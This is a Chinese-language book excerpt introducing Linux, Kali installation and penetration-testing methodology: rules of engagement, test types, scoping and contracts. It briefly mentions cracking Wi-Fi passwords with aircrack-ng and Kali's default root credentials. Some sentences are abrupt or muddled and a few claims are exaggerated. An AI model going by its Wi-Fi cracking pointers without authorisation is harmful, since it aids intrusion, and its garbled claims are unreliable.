# 第1章 Linux入门



要理解作为云计算、物联网、DevOps及企业服务器领域主导操作系统的Linux，对IT职业发展至关重要。梳理清楚开源软件许可的体系并不容易，但请允许我为你介绍一些核心要点。如果你计划使用Linux这类自由软件开展工作，就需要了解规范这类软件的基本规则。我们先来看许可的相关内容。主要有三大许可机构：
- 自由软件基金会，由理查德·斯托曼于1985年创立
- 成立较晚的开源促进会
- 知识共享（Creative Commons）
首先，自由软件基金会追求的软件“自由”并非免费的概念，而是赋予用户随心所欲使用软件的权利。你可以这么理解：你或许需要为软件付费，但一旦它属于你，你就可以随意处置。理查德·斯托曼及其基金会是GNU通用公共许可证（GPL）的原始起草方，该许可证赋予用户任意处置其软件的权利，包括修改和售卖，前提是不得更改原许可证的条款。Linux内核是基于GPL发布的最核心的软件。
然而，开源促进会虽然会在尽可能的情况下与自由软件基金会合作，但认为如果开源软件要在更广泛的软件市场产生最大影响，就应当提供更灵活的许可方案。开源指的是将软件的原始编程代码与程序本身一同免费开放给用户。与开源促进会目标更契合的许可包括不同版本的伯克利软件套件（简称BSD），其要求仅在于再分发时需注明原软件的版权声明与免责条款。这使得商业开发者可以更轻松地在新许可模式下部署其修改后的软件，无需担心违反原有限制。FOSS和FLOSS这两个称谓可用于体现这两种理念的差异：FOSS仅指软件可以免费获取，而FLOSS关注的是你获得软件后可以对其进行的操作。
知识共享许可证允许几乎所有类型作品（如软件、电影、音乐或书籍）的创作者自行选择想要保留的权利。在知识共享体系下，创作者可从以下五项要素中自由组合选择：
- 署名：只要注明创作者署名，即可允许修改和再分发
- 相同方式共享：要求所有后续的分发和副本均需包含原许可证条款
- 非商业性使用：仅允许非商业用途
- 禁止演绎：允许再分发，但仅限未修改的副本
- 公共领域：允许所有可能的使用方式
使用经知识共享协议发布的软件时，务必清楚作者选择了哪些具体要素。知识共享的相同方式共享条款与斯托曼的GPL一样，在实际中都属于Copyleft（著佐权）分发体系的一部分。Copyleft许可证允许软件的完全复用和再分发，但前提是原许可条款需包含在下一级的分发中。这对于不希望自己的软件最终演变为闭源许可类型、但希望衍生作品永远保持自由的作者而言非常有价值。非Copyleft的开源许可通常被称为宽松式许可，这类许可一般无需遵守任何上游限制。这类许可的常见例子包括MIT、BSD和Apache许可证，只要在衍生作品中注明原作品来源，通常允许对许可软件进行几乎任何形式的使用。如今，Apache和MIT许可是应用最广泛的两类许可。
但开源软件免费这一事实并不意味着它在盈利性公司的运营中没有用武之地。事实上，许多规模最大、利润最高的公司的产品都是用开源软件构建的。很多情况下，企业会将自己的软件以开源形式免费发布，同时向付费用户提供优质服务与支持。举例来说，Ubuntu和CentOS这两个Linux发行版就遵循这一模式，它们由Canonical和红帽持续提供支持，这两家公司均为企业客户提供支持服务，都是非常成熟的企业。另一个例子是红帽Linux，它已被IBM以超过300亿美元的价格收购。值得注意的是，Linux内核的大部分贡献都来自谷歌、微软等大型科技公司的全职员工。
奇怪的是，查看设备上开源软件的使用许可并不总是那么容易。桌面应用通常会通过“帮助与关于”菜单选项提供许可信息，但在其他情况下，查找特定产品的许可信息的最佳方式是访问其官方网站。最初的Linux内核由林纳斯·托瓦兹于20世纪90年代初创建，随后被捐赠给社区。“社区”指任何人在任何时间、任何地点都可以参与，“捐赠”意味着任何Linux组件的编程代码都将免费向所有人开放，可供下载、修改，以及进行任何其希望进行的操作，包括对自定义版本盈利（如果他们愿意的话）。
计算机操作系统（OS）是一组专用于解析用户命令的软件工具，可将用户命令转换为主机计算机可识别的指令。几乎任何操作系统都可以在大多数标准硬件架构上安装运行，只要其拥有足够的内存和处理能力来支持操作系统的各项特性。因此，你可以在任何PC或Mac、搭载ARM处理器的小型开发板，或者Docker环境中的虚拟化容器镜像上原生运行Linux。
几乎所有桌面操作系统都提供两种访问工具的方式：图形用户界面（又称GUI）和命令行界面（CLI）。所有现代操作系统都允许你通过GUI安全、稳定地运行各类专业的生产力和娱乐工具，并提供合适的环境供你开发自有软件，而这正是第一代个人计算机仅能实现的功能。所有Linux发行版都有这一共通点，但它们的差异也更有趣。
Linux与其商业竞品最明显的区别在于不存在商业限制：其他操作系统有这类限制，但Linux没有。这意味着你可以自由地在任意数量的硬件设备上安装任意数量的Linux版本，无人可以干涉。这种自由度会改变你使用操作系统的方式，因为它赋予你足够的灵活性来做出最符合你需求的修改和自定义。将安装有Linux文件系统的硬盘从一台计算机拆下后安装到另一台，设备可以正常运行，这种情况十分常见，这在Windows或Mac OS上是做不到的。我经常同时运行多达半打虚拟和实体Linux实例来测试各类软件流程和网络设计，如果还需要单独购买许可的话，我可能永远不会这么做。
这能为你带来两个直接的好处。首先，随着你Linux技能的提升，你可以花大量时间试验各类Linux发行版和桌面环境，并且可以在上线公司新的基于Linux的资源前，自然地进行测试部署，确保其正常运行。Linux环境由三大核心组件构成：
- Linux内核
- GNOME或Cinnamon这类桌面界面
- 你所用特定发行版（如Ubuntu或红帽）提供的自定义功能
通常你无需下载或直接管理Linux内核，这会由你所选发行版的安装和更新流程自动处理。为保持稳定性，发行版通常会连续数月忽略非关键的新内核版本，这是很常见的做法。发行版尤其是规模较大、知名度较高的发行版会定期更新，而安全补丁和关键功能补丁几乎会立即发布。大多数发行版都管理着第三方软件仓库，且

用于处理更新的包管理工具。如果你打开Linux系统中的「软件和更新」对话框，就可以选择想要的更新应用方式。除了操作系统本身，还有数以千计的免费软件包可供使用，这些软件包能帮你完成任何可行的计算任务，且速度和安全性都远超其他平台。无论是寻找办公生产力套件，还是网页服务器、安全服务，这些都会被可靠的包管理器无缝集成到Linux系统的运行体系中。
举个例子，如果你要在Windows或Mac上使用Adobe这类剪辑软件，想要让它们高效运行且不出现系统卡顿，就得配备高速CPU、32GB内存以及独立显存。这类整机可能要花费数千美元，还需要配备冷却系统防止硬件过热熔毁。不过如果使用Linux，你只需要一台价格不到300美元组装而成的普通PC，就能同时运行虚拟化进程和日常常规任务。
由于Linux是开源的，许多人根据特定需求开发了自己的操作系统版本，这类版本被称为发行版（distribution），也常简称为“distros”。其中最著名的就是谷歌面向智能手机开发的Android操作系统，此外还有数百种其他发行版，比如面向企业部署的红帽企业版（Red Hat Enterprise），以及由其社区免费重建的CentOS。还有专门针对科学和高等数学应用优化的Scientific Linux发行版、用于网络安全测试与管理的Kali Linux（我们稍后会详细介绍），以及其他专为物联网（IoT，Internet of Things）设备嵌入式开发的发行版，比如适配超低价树莓派（Raspberry Pi）开发板的Raspbian。
发行版通常会归类为不同的家族。比如某个特定的发行版可能因稳定性强、设计优秀、补丁更新快、第三方软件生态繁荣而获得良好口碑。其他社区无需重复造轮子，可以基于该父级发行版分叉出带有自身定制修改的衍生版本，以新名称分发，但原有的父子层级关系依然保留。更新和补丁会从上游父级发行版推送到所有下游子级发行版中。这是维护自治系统的高效方式。
最知名的发行版家族包括Debian，其维护的下游生态中就有全能型发行版Ubuntu。薄荷Linux（Linux Mint）、Kali Linux，以及红帽负责维护CentOS和面向普通用户的Fedora发行版；SUSE则提供OpenSUSE；还有以复杂难上手但运行效率极高著称的Arch Linux，其下游衍生发行版包括用于家庭娱乐管理的LinHES，以及注重图形界面的Manjaro。
你还能找到适用于各类专用部署场景的Linux发行版镜像。极致轻量的发行版可以嵌入到冰箱、灯泡这类物联网设备中。Docker容器速度快、效率高，因为它们会和承载它们的Linux主机环境共享操作系统内核，而且可以基于各类Linux镜像构建。
以AWS（亚马逊云科技，Amazon Web Services）和Azure为代表的虚拟化按需服务计算平台所构成的云服务非常出色，它几乎涵盖了我们已知的所有计算服务。Linux功能多元且免费，因此是云部署的理想操作系统。运行绝大多数云实例所用的另一种Linux版本，就托管在微软的Azure云平台上。全行业向云端转型的重要意义，催生了一批专门定制的Linux发行版，这类发行版以尽可能小巧、快速为目标，旨在提供最优的云使用体验。这类专用发行版通常会内置开箱即用的功能，让你能够充分利用特定云主机环境的特性。比如AWS的Amazon Linux AMI就属于这类发行版。AMI是Amazon Machine Image（亚马逊机器镜像）的缩写，专为长期支持打造的Ubuntu版本也采用这类镜像格式。
长期支持（LTS，Long Term Support）版本的构建目标是极致稳定，所有软件和配置都经过了充分测试。这类配置的高度可靠性，使得发行版维护方能够为对应版本持续提供长达5年的安全更新和功能更新。你可以将LTS版本部署为服务器，完全无需担心在5年周期内需要重建系统。如果你想要尝试最新最强大的软件版本，可以安装最新的过渡版；但在需要稳定性的生产环境中，必须选用LTS版本。
总的来说，开源软件的发布可以使用多种许可模式。GNU通用公共许可证（GPL，GNU General Public License）允许用户任意使用、修改或再分发软件，只要不更改原许可条款即可。知识共享（Creative Commons）许可允许设置更严格的许可条件，为软件创作者提供更多选择。其他主流的许可模式还包括Apache、BSD和MIT许可。
Linux是一个灵活的平台，可以定制后为所有物理或虚拟计算设备提供动力。你已经了解了Linux发行版的相关知识：它们会将Linux内核、图形用户界面（GUI）、专用软件及配置打包在一起。我们之前讨论过的发行版家族包括红帽企业版Linux（Red Hat Enterprise Linux）、Debian和Arch。

 登录新工作站后要做的第一件事。CentOS安装程序会询问你，是要为系统设置一个普通用户，还是仅使用root用户即可。虽然系统不会强制要求创建普通用户，但为了加固安全防护，强烈建议日常操作时避免以“root”用户身份登录。相比之下，以普通用户身份登录并处理工作，在需要时通过sudo调用管理权限是更优选择。例如，标准Ubuntu安装流程甚至不会提供使用root的选项。存储设备方面，你始终可以选择默认方案，大多数情况下整个文件系统会安装到单个分区中，但如果遇到更复杂或特殊的用例，你也可以探索其他选项。许多服务器管理员更倾向于将“`/var`”目录层级单独放在一个分区中，确保系统日志数据不会占满整个系统的其余空间。你可以用一块体积小、速度快的SSD（固态硬盘）存储大部分系统文件，而更大的“home”和*var*目录则挂载到容量更大但速度慢得多的机械硬盘上。这样既能利用SSD的高速特性运行Linux二进制文件，又能用成本更低的机械硬盘存储数据，两者性能差异在实际使用中几乎感知不到。
安装过程中会询问你是否希望将存储设备管理为“LVM卷”。那什么是LVM卷呢？LVM是逻辑卷管理器（Logical Volume Manager）的缩写，这是一种存储设备虚拟化方案，后续可以很方便地对存储进行调整。它的工作原理是这样的：假设你的系统上接有三块独立的物理硬盘，LVM会将它们整合为一个卷组，该卷组的容量等于三块硬盘的总存储空间之和。你随时可以基于该卷组创建任意数量的逻辑卷，只要总容量不超过卷组的可用空间上限，单卷容量可自由组合。如果你的三块硬盘容量分别为2TB、500GB和200GB，且你需要一个至少2.3TB的数据盘，就可以用LVM创建一个2.3TB的逻辑盘，再创建一个400GB的逻辑盘用于存储其他数据。如果未来需求发生变化，你可以缩小数据盘的容量，将多余的数据转移到第二个逻辑盘或新创建的逻辑盘中，新增或替换逻辑卷的操作相对很简单。LVM能提供非常灵活的配置能力，但对于简单的使用场景而言，通常并非必需。

很多人一提到无线适配器和无线网卡就会搞混，不知道它们是什么、为什么需要、又该如何在品牌和型号极多的情况下挑选到合适的产品。我们所说的无线适配器，是指可以通过USB端口连接到计算机、支持与Wi-Fi网络上的其他设备通信的硬件，你可以用它接入无线网络，与其他使用Wi-Fi的计算机进行通信。你可能会说自己的笔记本电脑已经自带这个功能了，没错，绝大多数笔记本电脑和智能手机都内置了无线网卡，但这样做存在两个问题。第一个问题是，如果将Kali Linux安装在虚拟机中，就无法使用内置的无线适配器；第二个问题是，这些内置无线适配器并不适合用于渗透无线网络。即使你将Kali Linux作为主系统安装在笔记本电脑上，能够使用内置无线网卡，你仍然需要单独购买一款无线适配器用于渗透测试，因为内置网卡大多不支持监听模式和数据包注入功能。你需要用它来破解Wi-Fi密码，完成在Kali Linux中借助aircrack-ng等工具能实现的所有渗透操作。

# 第3章 安装VirtualBox和Kali Linux
VirtualBox是一款专业的操作系统虚拟化软件，你可以把它安装在Windows、Macintosh系统、任意Linux发行版以及Solaris系统上。它可以免费下载。进入官网后，你可以选择对应系统平台的安装包进行下载。
下载安装好VirtualBox后，你就可以创建并运行多个虚拟机（VMs，Virtual machines）。VirtualBox的安装教程在其官网均有列出，前一章已经介绍过相关获取渠道。这款软件操作简单，推荐用它运行Kali Linux。你也可以使用VMware等其他同类虚拟环境，但我本人已经使用VirtualBox多年，因此本书后续内容都会基于这款软件展开。
Kali Linux是一款Linux发行版操作系统，既可以作为主力系统使用，也可以通过虚拟机的方式运行。你可以通过DVD或者U盘启动运行它。下载好ISO镜像文件后，你可以在现有系统之上直接安装它。
Kali Linux是最佳的渗透测试工具包，内置数百款工具，可直接用于对任意网络开展渗透测试。Kali Linux可用于检测现有网络、排查可能存在的漏洞，从而提升整体网络安全水平。Kali Linux操作也非常友好，内置的工具涵盖信息收集、取证、逆向工程、压力测试、漏洞评估、报告工具、漏洞利用、权限提升、维持访问等多个类别，功能远不止这些。
下载好Kali Linux并准备在虚拟机中安装时，有一些细节需要注意。创建Kali专用虚拟机时，你至少要分配4Gb内存，另外预留20Gb作为虚拟硬盘空间。新建虚拟机配置完成后，需要进入设置界面，将网络模式调整为桥接模式，把虚拟机桥接到你的路由器上。
完成设置后就可以启动镜像了，你需要输入命令``` startx ```然后按回车。这会启动硬盘中的图形用户界面（GUI，Graphical User Interface）安装程序，也推荐你安装图形界面。图形界面安装过程中会弹出几个需要你回答的问题，包括语言、键盘布局、所在地区以及时区时钟设置。安装完成后需要重启镜像，从硬盘启动。
重启完成后，Kali会进入命令行界面（CLI，Command Line Interface）要求你输入登录信息。用户名输入``` root ```，密码输入``` toor ```之后按回车。如果你是命令行界面新手，不知道输入什么命令也不用担心，只要输入``` startx ```并按回车，就可以切换到图形界面。这会打开操作友好的图形界面，你可以使用其中所有的渗透测试（Pen Test）工具，我们后续会逐一介绍。
接下来还需要进行IP地址的基础配置。Kali Linux默认会从DHCP服务器获取IP地址，但推荐你配置静态IP地址，这样就不会出现IP对应不上设备的情况。在Kali中配置IP地址需要输入的命令行是：``` ifconfig eth0 10.10.10.2/24 up ```
接下来需要配置默认网关，也就是你的路由器IP地址，输入以下命令即可：``` route add default gw 10.10.10.1 ```
配置完成后，输入以下命令ping路由器的IP地址，测试连通性：``` ping 10.10.10.1 ```
如果能ping通默认网关，说明你已经可以通过该路由器访问网络，再输入以下命令测试互联网连通性：``` ping www.google.com ```
如果ping成功，说明你虚拟机中安装的Kali Linux已经连接到互联网。你需要联网的原因是更新Kali Linux，这是你安装完成后首先要做的任务。全新安装系统后，首先要做的就是更新操作系统。
高级打包工具（Advanced Packaging Tools，简称APT）拓展了Debian包的功能，可以通过搜索软件源，安装或升级软件包以及所有必需的依赖项。打开控制台输入**apt-get update**，该命令会按照sources.list文件中定义的软件源，重新同步本地的包索引文件。执行升级或发行版升级操作前，必须先运行update命令。
接下来需要给升级命令加上**-y**参数，这样系统会自动确认安装，无需每次都手动输入yes。apt-get upgrade的作用是什么呢？它会安装系统中所有已安装软件包的最新版本，也就是给Kali中有可用新版本的现有软件包进行升级。需要注意的是，upgrade命令不会修改或删除未参与升级的软件包，也不会安装系统中原本没有的软件包。
最后需要执行**distribution upgrade**（发行版升级）命令，该命令会升级系统中所有已安装的软件包及其依赖项，同时移除系统中过时的旧包。接下来需要重启你的设备，重启完成后你就得到了一个全新的、干净的Kali系统。
要列出设备中已安装的Debian软件包，你可以运行以下命令：**sudo apt list --installed**
如果软件包数量很多，想知道某个特定工具是否已经安装，可以添加grep过滤参数筛选结果。要查看软件包的完整描述和依赖信息，运行以下命令："dpkg --status <package_name>"
最后，如果你想要卸载Kali中的某个软件包，执行以下命令即可："sudo apt-get remove <package_name> # 卸载该软件包"
当然，你需要把<package_name>替换为对应的应用程序名称。

# 第4章 渗透测试简介
我们已经讲解了Linux基础知识，尤其是Kali Linux，以及道德黑客可能需要的额外软硬件。但你在承接道德黑客相关的工作时，不应该直接冲着Kali的命令行或图形界面去，而是要先了解整个工作的流程。因此，我们首先要了解什么是渗透测试，以及它在侦察和踩点阶段是如何运作的。之后我们会讨论如何进行渗透测试，以及如何扫描你的目标。
首先，我们必须明确我们做渗透测试的根本原因。这看似是个显而易见的问题，但我们会为你展开更多细节。
接下来我们会介绍不同类型的渗透测试，除了类型差异外，你还需要了解参与其中的不同角色。然后我们会讲解渗透测试的三个不同阶段，让你完全明白每个阶段的内容。
首先我们会看预攻击阶段，我们会在这个阶段花费大量时间，因为我们需要设定一些参数，同时做好法律层面的自我保护。之后我们会看第2阶段，也就是攻击阶段会执行的操作。最后我们会看攻击后的收尾步骤，以及你需要遵守的相关标准。这些标准中，部分由厂商制定，部分是公开标准，你可以根据自己的目标选择想要遵循的标准。确定适合自己的标准后，就要严格遵守。
回到最开始的问题：“我们为什么要做渗透测试？” 这个问题看似简单，答案也显而易见，但实际上我们开展渗透测试的原因有多个。首先，我们通过模拟攻击来评估目标组织当前的安全状况，找出恶意攻击者可能利用的漏洞。另一个开展渗透测试的合理原因是完善安全防护措施。既然我们要对网络发起测试，顺带评估甚至重新设计当前的安全机制不是非常合理吗？



## 渗透测试概览
### 核心目标与执行要求
很多人认为渗透测试旨在发现漏洞，但我们不会仅停留在指出漏洞层面，还会重点说明该缺陷或漏洞对企业造成的影响。
渗透测试完成后，我们会提交一份包含所有发现详情的综合报告。你也可以认为，渗透测试的目的不仅是暴露安全体系的漏洞，还能为灾难恢复和业务连续性规划提供支持。
其核心目标是模拟恶意攻击者用于尝试入侵你网络的方法。
首先，你需要明确列出渗透测试的目标。不同企业的测试需求存在差异，并非所有元素都需要纳入测试范围。确定测试参数是首要工作，同时要明确针对相关系统发起攻击的限制条件或依据。
想要执行高质量的渗透测试，另一个要点是遵循一套成熟的方法论。我们后续会介绍具体方法，但你最好专注采用某一套体系，因为绝大多数成熟方案都能确保你覆盖所有测试要点。
文档记录同样是高质量渗透测试的核心要素。我们要确保客户能够理解报告内容，测试人员也需要随时就报告中的内容解答客户提出的疑问。
想要执行高质量的渗透测试，你还需要证明配备了合适的工具。这些工具包括商业付费工具、开源工具，有的可自动执行任务，有的需要配合脚本使用，也有仅通过标准命令行界面操作的常规工具。
想要执行高质量的渗透测试，还需要选对参与人员。你可能并非独自完成测试，若为单人测试，你需要确保自身及其他所有参与人员都是合法的渗透测试工程师，且遵守保密协议相关规定。
如果你受雇开展可能对企业造成损害的渗透测试，这一点尤为重要。帮助保护客户是你的职责所在，也是你的职业操守要求。
- 明确测试目标：根据企业实际需求，优先明确测试范围、边界、限制条件，以及针对目标系统发起攻击的依据
- 采用统一的测试方法论：选择成熟的方法体系，确保覆盖所有测试要点无遗漏
- 留存完整的文档记录：确保报告清晰易懂，测试人员需随时解答客户针对报告提出的疑问
- 选用适配的测试工具：工具可包含商业付费工具、开源工具、自动化工具、脚本以及标准命令行接口
- 确保人员合规：所有测试人员均为合法渗透测试工程师，需遵守保密协议，具备职业操守，测试过程中避免对企业造成损害
### 渗透测试的附加价值
你还需要确保，不仅指出存在的问题，在报告发现结果时，还要提供修复问题的可行建议，始终给出解决方案。
除开展渗透测试的四大核心原因外，还有几点其他价值值得你了解。
- 为漏洞发现结果附带可落地的修复建议，而非仅指出问题
- 推动基础设施优化：针对硬件、软件、网络架构提出安全优化方案，提升企业整体安全水平
- 制定漏洞预防方案：提前准备响应措施，避免漏洞被利用
- 评估网络设备安全性：检查防火墙、路由器、交换机、Web服务器、文件服务器及其他设备的安全防护效果
- 验证现有防御体系：由于网络环境是动态变化的，过往测试结果无法反映当前安全状态，因此需要定期开展测试以确认安全管控措施的有效性
- 支撑安全团队建设：协助搭建或优化安全团队，针对特定漏洞开展定向培训，明确各系统负责人员的安全职责
- 识别组织资产面临的威胁：不同行业的威胁特征存在差异，例如医院与中小企业的安全防护优先级各不相同
- 降低安全成本、提升投入产出比：识别并修复漏洞，避免不必要的安全投入，提升安全设备的利用效率
- 为安全体系建设提供依据：可用于制定安全策略、流程、落地计划以及新架构设计方案
- 支撑企业运营规划：协助企业制定系统、流程、执行计划及长期发展规划
- 满足监管合规要求：适配特定行业的法律法规要求
- 降低法律风险：避免因未保护客户数据导致数据泄露，引发客户集体诉讼等法律纠纷
### 渗透测试与其他安全测试的差异
当我们讨论渗透测试时，你会接触到安全审计、漏洞评估等不同类型的测试术语。部分人可能会混用这些概念，但二者存在明显差异：
- 安全审计：核查企业是否遵循一套标准的安全策略与流程
- 漏洞评估：侧重于发现网络中的漏洞，但无法判断漏洞是否可被利用，也无法评估漏洞被利用后可能造成的损害
综上，渗透测试是一种系统性的安全评估方式，涵盖安全审计的内容，同时验证攻击者是否能够成功利用系统中的薄弱点。
### 渗透测试团队类型
进行渗透测试时，你也会接触到不同类型的测试团队，共有两类，我来分别介绍：
- 红队（攻击队）：由道德黑客组成，无权限或仅拥有有限的企业内部资源访问权限，可提前通知或突击发起攻击，队伍可能包含企业不同部门的系统管理员，用于模拟真实恶意攻击者的行为
- 蓝队（防守队）：拥有全部企业资源与信息的访问权限，核心职责是检测并处置红队的攻击活动，预判突袭可能发生的方式。队伍可能包含系统管理员和普通IT人员，是成本最低、应用最广泛的评估方式
### 渗透测试分类
渗透测试的分类主要取决于测试方法、测试开始前企业向测试人员提供的信息量，以及测试是内部测试还是外部测试。
- 白盒测试：测试人员在测试前已完全掌握基础设施相关信息，企业会提供网络拓扑图（含所有相关架构图）、资产清单和软件清单。这类测试适用于需要开展全面安全审计的场景。但需注意，信息安全是持续性的过程，渗透测试仅能反映测试当时企业的安全状态，无法代表长期安全水平。
- 黑盒测试：分为两类：
  - 盲测：渗透测试人员不了解企业和目标的相关信息，但目标方会被告知审计范围，包括测试的内容、方式和时间。测试过程中，测试人员会模拟真实攻击者的侦查、踩点、扫描等行为，收集公开可获取的信息。由于耗时较长，这类测试成本较高。
  - 双盲测试（零知识测试）：渗透测试人员不了解目标信息，目标方也不被告知审计范围，双方均不清楚测试的内容和方式。这类测试可以检验所有相关人员的安防意识，是当前应用较广泛的评估方法之一。
- 灰盒测试：是白盒测试与黑盒测试的结合，测试人员仅掌握部分信息（例如服务器域名）。相比黑盒测试，它跳过了黑盒测试早期的信息收集阶段，可节省测试时间。假设你能完成相关工作，它还可以提供
这种被称为双重视角的方法，能够同时从开发者和攻击者两个角度对完整系统进行检查。因此，我们既可以从外部发起攻击，也可以通过模拟心怀不满的内部员工发起攻击的方式开展测试。你可以采取几种不同的测试策略。
首先，你可以采用公开通知策略。在这种策略下，渗透测试人员需要先全面了解组织的整体基础设施，同时还会被授予物理访问权限。这种方式的问题是，由于测试已提前告知目标方，因此对网络运营造成的影响较小。
而针对未公开通知的策略，其优势在于既可以测试安全人员的安全知识掌握水平，同时也能检验组织的社会工程学攻击防御能力。采用未公开通知策略时，只有最高管理层知晓测试的存在以及测试的计划排期，服务台、基础设施团队、应用团队等常规IT人员完全不知道测试将在何时开展。这种方式往往会产生更显著的影响，同时需要制定严格的流程来明确待执行的具体操作。实施未公开通知策略的核心目标是测试基础设施的安全警觉性，以及IT人员的应急响应速度。
# 第5章 渗透测试
### 阶段1：前期沟通
渗透测试的第一阶段也被称为前期沟通阶段，这一阶段的核心目标是尽可能多地收集目标相关信息。这类信息可以通过扫描、踩点等技术手段获取。你必须明确测试边界，这是你首先要确定的内容，但就像军事行动一样，渗透测试也有交战规则。例如，军事人员除非遭到攻击，否则不得开火；即使看到有人携带武器，也不意味着可以直接射击。具体规则取决于他们所参与的战争类型，每场战争都有各自独立的交战规则，渗透测试也是如此。
你正在申请开展渗透测试的正式授权，在交战规则中，你可以明确是否开展技术类或非技术类活动，这些活动会由交战规则明确定义。开展渗透测试的安全专业人员可能会被授权实施一些通常被视为非法的操作。
需要纳入交战规则的内容包括：你被允许测试的IP地址范围，不得超出该范围开展测试；测试开展的时间，比如是否仅限工作时间开展，还是包含非工作时间。你可能会有疑问：“渗透测试可以在任何时间开展吗？” 答案是肯定的，但具体时间取决于你的模拟场景：例如，模拟内部的灰盒攻击可能严格限定在工作时间内开展。
你还需要整理客户或部门列出的受限主机清单，如果你看到清单外的IP地址，不要对其进行任何操作！你还需要列明允许使用的测试方法，比如社会工程学、拒绝服务攻击，以及将使用的工具，比如密码破解工具、网络嗅探器等。举例如下，如果使用Nmap工具，需要明确是使用激进的Nmap扫描模式还是隐匿的Nmap扫描模式？
你还需要明确测试周期，根据测试内容或双方协商的结果，部分渗透测试可能需要耗时2到3个月才能完成。同理，渗透团队的所有成员都需要指定紧急联系人，用于紧急情况对接。你还需要列明相关风险防控措施，避免测试引发的虚假警报导致执法部门介入，尤其是涉及物理测试的场景。交战规则还需要包含你所收集信息的处理方式。
对企业开展渗透测试的前提条件之一是，企业需要向你提供一台专用测试笔记本。这台笔记本不会归你所有，但你可以将其用于渗透测试全程，包括撰写报告。渗透测试完成后，你需要将该笔记本连同操作说明一并返还给企业，企业会将这台笔记本留存，用于后续可能的渗透测试跟进工作。这样你就不会被指控将企业信息存储在你的个人设备中。
技术更新迭代非常快，如果这台笔记本被存放5到6年，很可能已经过时无法使用。因此，你也可以建议客户将电脑的硬盘拆出单独存放，仅存储硬盘，并确保数据存储在极其安全的位置。
你需要整理客户的全部需求，以及访谈过程中收集到的所有信息，确保你可以满足客户的所有需求。你需要和需要接受测试的客户或部门逐一核对，涉及的对象包括服务器、工作站、路由器、防火墙、网络设备、数据库、应用程序、物理安全、电信系统、语音系统等。你还需要创建一份需求核对清单，明确客户要求你对上述特定对象实施的测试内容。
你还需要明确待测试的业务领域并梳理相关用户，例如你可能只需要针对IT部门这类特定部门开展测试，你需要提前告知这些部门的相关人员，未来1周左右可能会开展相关测试。
你还需要明确测试的时间范围，但必须确保该时间范围符合客户的要求，除非客户主动征询你的建议，否则不要以你认为的最优时间为准。你还需要制定应急预案，以应对你发现真正的恶意攻击者已经入侵的情况。遇到这类情况时，你需要在开展任何操作前确保所有信息已安全备份，因为你实施的某些操作可能会修改原始文件。
你还需要确定报告将使用的格式，是使用标准的Word文档？还是需要PDF格式？客户需要看到哪些内容？报告内容是否需要根据查看者的不同有所区分？例如，IT部门的管理者可能不想看到所有事件细节，只需要看到需要他处理的相关问题，以及报告交付的相关责任人。你在此处需要格外谨慎，因为很多时候，在评估IT人员的工作并提交报告时，报告内容需要具有建设性，而非讥讽性质，且需要以客观真实的形式交付。提交这份报告的安全专业人员需要意识到，这可能会引发对方的负面情绪，无论你是否情愿，都必须如实上报所有发现。
为了梳理好所有内容，你需要开始列清单。以下是你可以在核对清单中包含的部分内容：
- 网络拓扑和子网，包括正在使用的IP范围；
- 服务器、网络设备以及建筑本身的物理安全（例如，未授权人员是否可以进入办公区域并访问空闲的RJ45网络接口）；
- 内、外部IP地址；
- 网络设备，包括路由器、交换机、防火墙、无线接入点、无线局域网控制器，以及各类设备的数量；
- 终端设备，包括无线和有线主机设备，如笔记本电脑、台式电脑；
- 打印机、扫描仪、监控摄像头、门禁安全机制、会议室设备（如投影仪、IPTV设备）、IP电话、会议IP电话，以及连接到网络的所有移动设备，包括手机、平板电脑、Apple Watch和Android手表；
- 组织的互联网资产分布图，展示从外部可访问的内容，以及连接到外网和内网的设备地址；
- 网络服务器上运行的操作系统：如果服务器数量在5台及以下，需记录各类操作系统的类型（Windows、Linux等）和各自的数量；如果服务器数量更多，需确认总数量和各类操作系统的分布情况；
- 无线网络、模拟系统和移动设备的评估要求，尤其针对拥有移动办公人员的组织；
- 客户提供的Web应用和服务，包括面向公众的网站功能，比如跳转至外部站点的重定向链接、网站内嵌的外部来源内容。

接下来，你还需要明确渗透测试的范围。这部分内容包含交付物，即测试完成后会提供的报告清单。你还需要明确数据定义，或测试结果将采用的格式。你还需要明确功能验证要求，确认系统是否按预期运行，以及技术架构相关的内容，这部分可以包含流程图，展示测试过程中实施的操作和具体步骤。



## 渗透测试：攻击前阶段
### 测试阶段变更管理
- 有一件事你需要重点关注，并且需要向客户解释清楚：如果渗透测试耗时较长，在测试期间，网络可能会在渗透测试人员不知情的情况下发生变更，而通常客户也不了解这些变更带来的影响。
- 在渗透测试期间进行任何修改之前，可将相关情况提交给渗透测试公司的项目负责人，由他向相关方说明即将进行的变更带来的影响。
- 这些变更包括业务流程变更，或是技术类变更，例如公司搬迁、应用更换等情况。这里所说的不是现有应用的更新，而是指完全更换为不同的应用。
### 测试范围定义
**在确定渗透测试范围时，测试团队应覆盖以下维度：**
- 系统软件安全与系统配置：检查软件及基于系统的漏洞。
- 网络安全：审查所有网络组件及其配置，例如检查是否仍在使用默认配置。
- 客户端应用安全：检查客户端应用的安全性与合规性，以及客户端到服务器传输流量的安全性，评估该流量的安全防护机制。
- 服务器端安全：完成客户端到服务器的流量检查后，审查服务器端应用及服务器上运行的应用本身是否存在缺陷。
- 社会工程学方法：在范围内实施社会工程测试，尝试收集密码或项目相关信息。
- 现有安全文档：同时需关注员工如何处理废弃文档，强调碎纸设备的使用。
### 扩展范围项
- 应用通信安全：评估是否存在未授权拦截的风险。
- 物理安全：检查组织是否仅允许相关部门物理访问系统。
- 文档处置风险：许多公司聘用在岗碎纸服务来处理文档，但信息仍可能通过普通垃圾泄露，需确保相关人员了解这是潜在的攻击向量。
- 内部威胁：检查是否存在可能泄露机密数据或携带数据跳槽至竞争对手的不满员工。
- 入侵者混淆机制：与客户确认是否部署了蜜罐等策略来混淆或误导入侵者；作为渗透测试人员，若已部署此类机制，需测试其有效性。
- 事件响应范围：在响应范围内开展测试，例如明确不同类型事件的恰当响应方式。
### 合同要求
接下来需审查合同，确保包含以下条款：
- 保密协议（NDA）：确保公司信息得到保护。
- 费用与进度条款：明确费用和时间线，若项目超出预估进度需特别注意，因为你可能会遇到未预料到的问题。
- 敏感信息文档：包含与公司电子资产、正在开发中的应用、或渗透测试团队所需的其他敏感信息相关的内容。
- 机密信息合同：涵盖商业秘密信息、网络信息、电话系统信息、客户数据或其他业务资料。这类信息会提供给渗透测试人员，这也正是我建议公司为你配备公司自有笔记本电脑的原因之一，这样他们无需担心你离职时会携带机密信息离开。
